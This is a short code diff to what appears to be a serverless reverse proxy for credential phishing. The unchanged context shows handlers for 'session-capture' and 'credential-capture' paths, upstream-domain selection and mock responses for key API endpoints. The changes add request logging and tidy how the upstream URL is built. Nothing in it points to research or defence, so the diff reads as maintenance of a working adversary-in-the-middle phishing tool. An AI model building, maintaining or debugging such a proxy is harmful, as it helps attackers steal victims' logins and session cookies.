@@ -110,6 +110,8 @@ app.http("proxy", {
             // Decode URL-encoded characters
             path = decodeURIComponent(path);
             
+            context.log(`Proxy request for path: ${path}`);
+            
             // Handle special endpoints for session capture
             if (path.includes('session-capture') || path.includes('credential-capture')) {
                 const body = await request.text();
@@ -128,6 +130,7 @@ app.http("proxy", {
 
             // Determine which upstream domain to use
             const selected_upstream = getUpstreamDomain(request, url);
+            context.log(`Selected upstream: ${selected_upstream}`);
             
             // Handle critical API endpoints that need mock responses
             const criticalEndpoints = [
@@ -198,9 +201,12 @@ app.http("proxy", {
                 });
             }
 
-            // Build upstream URL
-            const upstream_url = new URL(`https://${selected_upstream}${path.startsWith('/') ? path : '/' + path}`);
+            // Build upstream URL - ensure path starts with /
+            const cleanPath = path.startsWith('/') ? path : '/' + path;
+            const upstream_url = new URL(`https://${selected_upstream}${cleanPath}`);
             upstream_url.search = url.search;
+
+            context.log(`Proxying to: ${upstream_url.toString()}`);
 
             // Prepare headers for upstream request
             const headers = new Headers();
@@ -227,6 +233,8 @@ app.http("proxy", {
                 headers: headers,
                 body: body
             });
+
+            context.log(`Upstream response status: ${upstreamResponse.status}`);
 
             // Process response
             const responseHeaders = new Headers();
